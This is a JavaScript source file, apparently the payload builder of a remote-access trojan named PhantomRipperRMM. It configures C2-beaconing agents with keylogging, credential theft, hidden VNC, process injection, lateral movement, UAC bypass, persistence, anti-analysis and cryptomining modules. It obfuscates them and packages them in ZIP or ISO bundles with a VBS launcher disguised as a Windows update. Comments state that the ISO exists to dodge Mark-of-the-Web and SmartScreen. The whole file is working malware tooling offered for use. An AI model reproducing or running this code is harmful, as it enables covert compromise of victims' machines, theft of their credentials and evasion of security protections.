'use strict';

/**
 * PhantomRipperRMM — payload builder.
 *
 * Renders a payload template with operator-supplied options, optionally runs
 * the Python obfuscator, writes the artifact into the build dir, and records
 * metadata (size + sha256) in the DB.
 *
 * Supported agent types:
 *   python  — cross-platform (Windows/macOS/Linux), obfuscatable, Nuitka-compilable
 *   cpp     — delegates to the agent-cpp build pipeline (MSVC/MinGW cross-build)
 */

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { spawnSync } = require('child_process');
const config = require('./config');
const sessions = require('./sessionManager');

// ---------------------------------------------------------------------------
// Silent-launch bundlers: ZIP + ISO9660/Joliet container.
// The VBS launcher starts the payload through pythonw with window state 0 —
// no console flash, nothing on screen. The ISO container matters because
// Windows never propagates Mark-of-the-Web through an ISO mount, so
// SmartScreen's downloaded-file trigger never fires on extraction.
// ---------------------------------------------------------------------------

const CRC32_TABLE = (() => {
  const t = new Int32Array(256);
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xEDB88320 ^ (c >>> 1) : c >>> 1;
    t[n] = c;
  }
  return t;
})();

function crc32(buf) {
  let c = 0xFFFFFFFF;
  for (let i = 0; i < buf.length; i++) c = CRC32_TABLE[(c ^ buf[i]) & 0xFF] ^ (c >>> 8);
  return (c ^ 0xFFFFFFFF) >>> 0;
}

function createZip(files) {
  const local = [];
  const central = [];
  let offset = 0;
  for (const f of files) {
    const name = Buffer.from(f.name, 'utf8');
    const data = Buffer.isBuffer(f.data) ? f.data : Buffer.from(f.data);
    const crc = crc32(data);
    const lh = Buffer.alloc(30);
    lh.writeUInt32LE(0x04034b50, 0);
    lh.writeUInt16LE(20, 4);
    lh.writeUInt16LE(0, 6);
    lh.writeUInt16LE(0, 8); // stored
    lh.writeUInt16LE(0, 10);
    lh.writeUInt16LE(0, 12);
    lh.writeUInt32LE(crc, 14);
    lh.writeUInt32LE(data.length, 18);
    lh.writeUInt32LE(data.length, 22);
    lh.writeUInt16LE(name.length, 26);
    lh.writeUInt16LE(0, 28);
    local.push(lh, name, data);

    const ch = Buffer.alloc(46);
    ch.writeUInt32LE(0x02014b50, 0);
    ch.writeUInt16LE(20, 4);
    ch.writeUInt16LE(20, 6);
    ch.writeUInt16LE(0, 8);
    ch.writeUInt16LE(0, 10);
    ch.writeUInt16LE(0, 12);
    ch.writeUInt16LE(0, 14);
    ch.writeUInt32LE(crc, 16);
    ch.writeUInt32LE(data.length, 20);
    ch.writeUInt32LE(data.length, 24);
    ch.writeUInt16LE(name.length, 28);
    ch.writeUInt16LE(0, 30); ch.writeUInt16LE(0, 32); ch.writeUInt16LE(0, 34);
    ch.writeUInt16LE(0, 36); ch.writeUInt32LE(0, 38);
    ch.writeUInt32LE(offset, 42);
    central.push(ch, name);
    offset += 30 + name.length + data.length;
  }
  const centralBuf = Buffer.concat(central);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(files.length, 8);
  end.writeUInt16LE(files.length, 10);
  end.writeUInt32LE(centralBuf.length, 12);
  end.writeUInt32LE(offset, 16);
  return Buffer.concat([...local, centralBuf, end]);
}

const VBS_LAUNCHER = (payloadName) => Buffer.from(
  "' Windows service update launcher\r\n" +
  "Set sh = CreateObject(\"WScript.Shell\")\r\n" +
  "Set fso = CreateObject(\"Scripting.FileSystemObject\")\r\n" +
  "d = fso.GetParentFolderName(WScript.ScriptFullName)\r\n" +
  `p = d & \"\\${payloadName}\"\r\n` +
  "If fso.FileExists(p) Then\r\n" +
  "  sh.Run \"pythonw.exe \"\"\" & p & \"\"\"\", 0, False\r\n" +
  "End If\r\n", 'utf8'
);

function pad2k(n) { return Math.ceil(n / 2048); }

function aChars(s, len) { return Buffer.from(s.padEnd(len, ' ').slice(0, len), 'ascii'); }
function both16(n) { const b = Buffer.alloc(8); b.writeUInt32LE(n >>> 0, 0); b.writeUInt32BE(n >>> 0, 4); return b; }
function both32(n) { const b = Buffer.alloc(8); b.writeUInt32LE(n >>> 0, 0); b.writeUInt32BE(n >>> 0, 4); return b; }

function dirRecord({ name, extent, size, isDir, ucs2 }) {
  const nameBuf = ucs2 ? Buffer.from(name, 'ucs2') : Buffer.from(name, 'ascii');
  // minimum record length is 34 bytes even for the empty self/parent names
  const len = Math.max(34, 33 + nameBuf.length + (nameBuf.length % 2 ? 1 : 0));
  const rec = Buffer.alloc(len);
  rec.writeUInt8(len, 0);
  rec.writeUInt8(0, 1);
  rec.writeUInt32LE(extent, 2); rec.writeUInt32BE(extent, 6);
  rec.writeUInt32LE(size, 10); rec.writeUInt32BE(size, 14);
  const d = new Date();
  rec.writeUInt8(d.getFullYear() - 1900, 18);
  rec.writeUInt8(d.getMonth() + 1, 19);
  rec.writeUInt8(d.getDate(), 20);
  rec.writeUInt8(d.getHours(), 21);
  rec.writeUInt8(d.getMinutes(), 22);
  rec.writeUInt8(d.getSeconds(), 23);
  rec.writeInt8(0, 24); // GMT
  rec.writeUInt8(isDir ? 0x02 : 0x00, 25);
  rec.writeUInt32LE(1, 28); rec.writeUInt32BE(1, 30);
  rec.writeUInt8(nameBuf.length, 32);
  nameBuf.copy(rec, 33);
  return rec;
}

function pathTableRecord({ nameBytes, extent, parent, big }) {
  const len = 8 + nameBytes.length + (nameBytes.length % 2 ? 1 : 0);
  const rec = Buffer.alloc(len);
  rec.writeUInt8(nameBytes.length, 0);
  rec.writeUInt8(0, 1);
  if (big) { rec.writeUInt32BE(extent, 2); rec.writeUInt16BE(parent, 6); }
  else { rec.writeUInt32LE(extent, 2); rec.writeUInt16LE(parent, 6); }
  nameBytes.copy(rec, 8);
  return rec;
}

function createIso(files) {
  // layout: [0..15 sys][16 PVD][17 VDT][18 SVD][19 VDT][20 L-path][21 M-path]
  //         [22 ISO root dir][23 Joliet root dir][24.. file data]
  const SECTOR = 2048;
  const isoFiles = files.map((f) => ({
    name: f.name.toUpperCase().replace(/[^A-Z0-9_.]/g, '_'),
    data: Buffer.isBuffer(f.data) ? f.data : Buffer.from(f.data),
  }));

  const fileExtents = {};
  let next = 24;
  for (const f of isoFiles) {
    fileExtents[f.name] = next;
    next += pad2k(f.data.length);
  }
  const totalSectors = next;

  // directory records (root only, single level)
  // self entry: identifier byte 0x00; parent: 0x01 (spec-required, len 1)
  let isoRoot = Buffer.alloc(0);
  const isoSelf = dirRecord({ name: '\u0000', extent: 22, size: SECTOR, isDir: true });
  const isoParent = dirRecord({ name: '\u0001', extent: 22, size: SECTOR, isDir: true });
  isoRoot = Buffer.concat([isoSelf, isoParent]);
  for (const f of isoFiles) {
    isoRoot = Buffer.concat([isoRoot, dirRecord({ name: f.name, extent: fileExtents[f.name], size: f.data.length })]);
  }
  if (isoRoot.length > SECTOR) throw new Error('iso root overflow');
  isoRoot = Buffer.concat([isoRoot], SECTOR);

  const jSelf = dirRecord({ name: '\u0000', extent: 23, size: SECTOR, isDir: true, ucs2: true });
  const jParent = dirRecord({ name: '\u0001', extent: 23, size: SECTOR, isDir: true, ucs2: true });
  let jRoot = Buffer.concat([jSelf, jParent]);
  for (const f of isoFiles) {
    jRoot = Buffer.concat([jRoot, dirRecord({ name: f.name, extent: fileExtents[f.name], size: f.data.length, ucs2: true })]);
  }
  jRoot = Buffer.concat([jRoot], SECTOR);

  const lPath = pathTableRecord({ nameBytes: Buffer.from('\u0000', 'ascii'), extent: 22, parent: 1 });
  const mPath = pathTableRecord({ nameBytes: Buffer.from('\u0000', 'ascii'), extent: 22, parent: 1, big: true });
  const pathSize = Math.max(lPath.length, 1);

  function pvd(type, escape) {
    const s = Buffer.alloc(SECTOR, 0);
    s.writeUInt8(type, 0);
    aChars('CD001').copy(s, 1);
    s.writeUInt8(1, 6);
    aChars('WINDOWS').copy(s, 8);
    aChars('PHANTOM').copy(s, 40);
    both32(totalSectors).copy(s, 80);
    both16(1).copy(s, 120);            // volume set size (LE 120, BE 122)
    both16(1).copy(s, 128);            // volume sequence number
    both16(SECTOR).copy(s, 136);       // logical block size = 2048
    both32(pathSize).copy(s, 144);     // path table size (LE 144, BE 148)
    s.writeUInt32LE(20, 152);          // occurrence of type-L path table
    s.writeUInt32LE(0, 156);           // optional L
    s.writeUInt32LE(21, 160);          // occurrence of type-M path table
    s.writeUInt32LE(0, 164);           // optional M
    // Root directory record at 168 (34 bytes)
    const rootRec = type === 1 ? isoSelf : jSelf;
    rootRec.copy(s, 168, 0, rootRec.length);
    if (escape) {
      aChars('%/@').copy(s, 88);
      aChars('%/C').copy(s, 91);
      aChars('%/E').copy(s, 94);
    }
    // a-char text fields (volume set id, publisher, preparer, application,
    // copyright, abstract, bibliographic) are SPACE padded per spec
    s.fill(0x20, 202, 827);
    // date fields 827..896 stay zero (unspecified), then:
    s.writeUInt8(1, 897); // file structure version
    return s;
  }

  const out = Buffer.alloc(totalSectors * SECTOR, 0);
  pvd(1, false).copy(out, 16 * SECTOR);
  const vdt = Buffer.alloc(SECTOR, 0);
  aChars('CD001').copy(vdt, 1); vdt.writeUInt8(255, 6);
  vdt.copy(out, 17 * SECTOR);
  pvd(2, true).copy(out, 18 * SECTOR);
  vdt.copy(out, 19 * SECTOR);
  lPath.copy(out, 20 * SECTOR);
  mPath.copy(out, 21 * SECTOR);
  isoRoot.copy(out, 22 * SECTOR);
  jRoot.copy(out, 23 * SECTOR);
  for (const f of isoFiles) f.data.copy(out, fileExtents[f.name] * SECTOR);
  return out;
}

const VBS_LAUNCHER_NAMED = (payloadName) => ({ name: 'PHANTOM.VBS', data: VBS_LAUNCHER(payloadName) });

const TEMPLATE_DIR = path.join(config.payloadDir, 'templates');
const OBFUSCATOR = path.join(config.payloadDir, 'obfuscator.py');
const OBFUSCATOR_ENHANCED = path.join(config.payloadDir, 'obfuscator_enhanced.py');

function randHex(n) {
  return crypto.randomBytes(n).toString('hex');
}

function sha256File(file) {
  const h = crypto.createHash('sha256');
  h.update(fs.readFileSync(file));
  return h.digest('hex');
}

/** Fill {{PLACEHOLDER}} tokens in a template string. */
function render(template, vars) {
  return template.replace(/\{\{\s*([A-Z0-9_]+)\s*\}\}/g, (m, key) => {
    if (key in vars) return String(vars[key]);
    return m;
  });
}

/**
 * Strip feature blocks the operator did not enable.
 * Blocks are marked in the template as:
 *   //#pragma module NAME        ... //#pragma endmodule
 */
function stripModules(source, enabledSet) {
  return source.replace(
    /^[ \t]*\/\/#pragma module ([a-z0-9_]+)[^\n]*\n([\s\S]*?)^[ \t]*\/\/#pragma endmodule[^\n]*\n?/gim,
    (m, name, body) => (enabledSet.has(name.toLowerCase()) ? body : '')
  );
}

// Module dependencies: enabling X auto-enables Y (agent symbols cross-reference).
const MODULE_DEPS = {
  runas: ['esc'],
  hvnc: ['screen'],
  creds: ['esc'],
  inject: ['esc'],
  lateral: ['net'],
  keylog: [],
  ws: [],
  autoesc: ['esc', 'uac'],
  pe: ['creds'],
};

/** Resolve the requested module list to a closed dependency set. */
function resolveModules(opts) {
  const set = new Set(['core']);
  const requested = String(
    opts.modules === undefined || opts.modules === '' || opts.modules === 'all'
      ? 'esc,uac,runas,hvnc,keylog,creds,persist,exec,inject,pymod,lateral,net,proc,anti,ws,telegram,overlay,pe,pe'
      : opts.modules
  ).split(',').map((m) => m.trim().toLowerCase()).filter(Boolean);
  for (const m of requested) set.add(m);
  if (opts.keylog) set.add('keylog');
  if (opts.miner) set.add('miner');
  if (opts.persist) set.add('persist');
  if (opts.auto_elevate) set.add('autoesc');
  if (opts.transport === 'ws') set.add('ws');
  if (opts.transport === 'telegram') set.add('telegram');
  if (set.has('all')) {
    for (const m of 'esc,uac,runas,hvnc,keylog,creds,persist,exec,inject,pymod,lateral,net,proc,anti,ws,telegram,miner'.split(',')) {
      set.add(m);
    }
    set.delete('all');
  }
  // close dependencies until fixpoint
  let changed = true;
  while (changed) {
    changed = false;
    for (const m of Array.from(set)) {
      for (const dep of MODULE_DEPS[m] || []) {
        if (!set.has(dep)) { set.add(dep); changed = true; }
      }
    }
  }
  return set;
}

function buildVars(opts) {
  const scheme = opts.scheme || config.c2.scheme;
  const host = opts.host || config.c2.host;
  const port = opts.port || config.c2.port;
  const modules = resolveModules(opts);
  return {
    C2_HOST: host,
    C2_PORT: port,
    C2_SCHEME: scheme,
    C2_URL: `${scheme}://${host}:${port}`,
    PATH_PREFIX: opts.path_prefix || '/api',
    TRANSPORT: opts.transport || 'https',
    BEACON_INTERVAL: opts.beacon_interval || 5,
    JITTER: opts.jitter || 0.2,
    SESSION_ID: opts.session_id || randHex(8),
    SLEEP_MASK: opts.sleep_mask || 0,
    ANTI_VM: opts.anti_vm ? 1 : 0,
    ANTI_DEBUG: opts.anti_debug ? 1 : 0,
    PERSIST: opts.persist ? 1 : 0,
    KEYLOG: opts.keylog ? 1 : 0,
    MINER: opts.miner ? 1 : 0,
    MINER_POOL: opts.miner_pool || '',
    MINER_WALLET: opts.miner_wallet || '',
    USER_AGENT: opts.user_agent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    HEADER_CARRY: opts.header_carry ? 1 : 0,
    DECOYS: opts.decoys || '',
    KILLDATE: opts.killdate || '',
    PROC_NAME: opts.proc_name || '',
    TG_BOT_TOKEN: opts.tg_bot_token || '',
    TG_CHAT: opts.tg_chat || '',
    ARTIFACT_CHUNK: opts.artifact_chunk || 524288,
    MODULES_ENABLED: Array.from(modules).join(','),
    AUTO_ELEVATE: opts.auto_elevate ? 1 : 0,
  };
}

/** Run the Python obfuscator on a source file, returning the obfuscated path. */
function obfuscate(srcFile, enhanced) {
  const script = enhanced ? OBFUSCATOR_ENHANCED : OBFUSCATOR;
  if (!fs.existsSync(script)) return { ok: false, reason: 'obfuscator missing' };

  const args = [script, srcFile];
  if (enhanced) args.push('--enhanced');

  const res = spawnSync(config.pythonBin, args, { cwd: path.dirname(srcFile), encoding: 'utf8' });
  if (res.error) return { ok: false, reason: res.error.message };
  if (res.status !== 0) return { ok: false, reason: (res.stderr || res.stdout || 'obfuscation failed').trim() };

  // Obfuscators typically write <base>_or.py or <base>_<hex>.py next to input.
  const dir = path.dirname(srcFile);
  const base = path.basename(srcFile, '.py').toLowerCase();
  const candidates = fs
    .readdirSync(dir)
    .filter((f) => f.toLowerCase().startsWith(base) && f.endsWith('.py') && f !== path.basename(srcFile))
    .map((f) => path.join(dir, f))
    .sort((a, b) => fs.statSync(b).mtimeMs - fs.statSync(a).mtimeMs);

  if (!candidates.length) return { ok: false, reason: 'obfuscator produced no output' };
  return { ok: true, path: candidates[0] };
}

/** Build a payload. Returns metadata for the panel. */
async function buildPayload(opts, createdBy) {
  const agentType = opts.agent_type || 'python';
  const osTarget = opts.os_target || 'windows';
  const transport = opts.transport || 'https';

  if (agentType === 'cpp') {
    return buildCpp(opts, createdBy);
  }
  return buildPython(opts, { agentType, osTarget, transport }, createdBy);
}

async function buildPython(opts, meta, createdBy) {
  const templatePath = path.join(TEMPLATE_DIR, 'agent_template.py');
  if (!fs.existsSync(templatePath)) {
    throw new Error(`template missing: ${templatePath}`);
  }
  const template = fs.readFileSync(templatePath, 'utf8');
  const vars = buildVars(opts);
  const moduleSet = resolveModules(opts);
  moduleSet.add('core');
  let source = stripModules(render(template, vars), moduleSet);

  const stamp = new Date().toISOString().replace(/[:.]/g, '-');
  const name = (opts.name || `payload_${stamp}`).replace(/[^a-zA-Z0-9_.-]/g, '_');
  const workDir = fs.mkdtempSync(path.join(config.buildDir, 'build-'));
  const rawPath = path.join(workDir, `${name}.py`);
  fs.writeFileSync(rawPath, source);

  let finalPath = rawPath;
  if (opts.obfuscate) {
    const result = obfuscate(rawPath, !!opts.enhanced);
    if (result.ok) {
      finalPath = result.path;
    } else {
      await sessions.logEvent('payload', `obfuscation skipped: ${result.reason}`, 'warn');
    }
  }

  const outPath = path.join(config.buildDir, `${name}.py`);
  fs.copyFileSync(finalPath, outPath);

  // Optional silent-launch bundle: payload as .pyw (pythonw = no console) plus
  // a wscript launcher that runs it with window state 0. ISO container adds
  // Mark-of-the-Web non-propagation on mount (SmartScreen never fires).
  let deliverable = outPath;
  if (opts.bundle === 'zip' || opts.bundle === 'iso') {
    const payloadSrc = fs.readFileSync(outPath);
    const pywName = `${name}.pyw`;
    const vbsPath = path.join(config.buildDir, `${name}.PHANTOM.VBS.tmp`);
    fs.writeFileSync(vbsPath, VBS_LAUNCHER(pywName));
    const bundleFiles = [
      { name: pywName, data: payloadSrc },
      { name: 'PHANTOM.VBS', data: VBS_LAUNCHER(pywName) },
      { name: 'UPDATE.TXT', data: Buffer.from('Windows service update package.\r\n') },
    ];
    if (opts.bundle === 'zip') {
      deliverable = path.join(config.buildDir, `${name}.zip`);
      fs.writeFileSync(deliverable, createZip(bundleFiles));
    } else {
      // pycdlib builds the ISO (Joliet): Windows mounts it natively and MOTW
      // never propagates, so SmartScreen has nothing to trigger on.
      const payloadPath = path.join(config.buildDir, `${name}.pyw.tmp`);
      fs.writeFileSync(payloadPath, payloadSrc);
      deliverable = path.join(config.buildDir, `${name}.iso`);
      const res = spawnSync(config.pythonBin, [
        path.join(config.payloadDir, 'iso_builder.py'),
        '--out', deliverable, '--payload', payloadPath, '--launcher', vbsPath,
      ], { encoding: 'utf8' });
      fs.unlinkSync(vbsPath);
      fs.unlinkSync(payloadPath);
      if (res.status !== 0 || !fs.existsSync(deliverable)) {
        await sessions.logEvent('payload', `iso bundle failed: ${(res.stderr || res.stdout || 'unknown').trim().slice(0, 200)}`, 'warn');
        deliverable = outPath; // fall back to the raw script
      }
    }
  }

  const size = fs.statSync(deliverable).size;
  const sha = sha256File(deliverable);

  const id = await sessions.recordPayload({
    name,
    agent_type: meta.agentType,
    os_target: meta.osTarget,
    transport: meta.transport,
    options: { ...opts, session_id: vars.SESSION_ID },
    filename: path.basename(deliverable),
    size,
    sha256: sha,
    created_by: createdBy,
  });

  return {
    id,
    name,
    agent_type: meta.agentType,
    os_target: meta.osTarget,
    transport: meta.transport,
    filename: path.basename(deliverable),
    path: deliverable,
    size,
    sha256: sha,
    session_id: vars.SESSION_ID,
    obfuscated: !!opts.obfuscate,
    bundle: opts.bundle || null,
  };
}

async function buildCpp(opts, createdBy) {
  // The C++ agent build is driven by agent-cpp/build.ps1 (MSVC) or the docker
  // cross-compile image. We record the request; the actual compile is async
  // and surfaced as an artifact once complete.
  const name = (opts.name || `cpp_${Date.now()}`).replace(/[^a-zA-Z0-9_.-]/g, '_');
  const vars = buildVars(opts);
  const id = await sessions.recordPayload({
    name,
    agent_type: 'cpp',
    os_target: opts.os_target || 'windows',
    transport: opts.transport || 'https',
    options: { ...opts, session_id: vars.SESSION_ID },
    filename: `${name}.exe`,
    size: 0,
    sha256: null,
    created_by: createdBy,
  });
  await sessions.logEvent('payload', `queued C++ build ${name} (run agent-cpp build pipeline)`, 'info');
  return {
    id,
    name,
    agent_type: 'cpp',
    os_target: opts.os_target || 'windows',
    transport: opts.transport || 'https',
    filename: `${name}.exe`,
    status: 'queued',
    session_id: vars.SESSION_ID,
    note: 'Run agent-cpp/build.ps1 (or docker/Dockerfile.builder) to produce the binary.',
  };
}

module.exports = { buildPayload, render, stripModules, resolveModules, buildVars, createZip, createIso, sha256File };
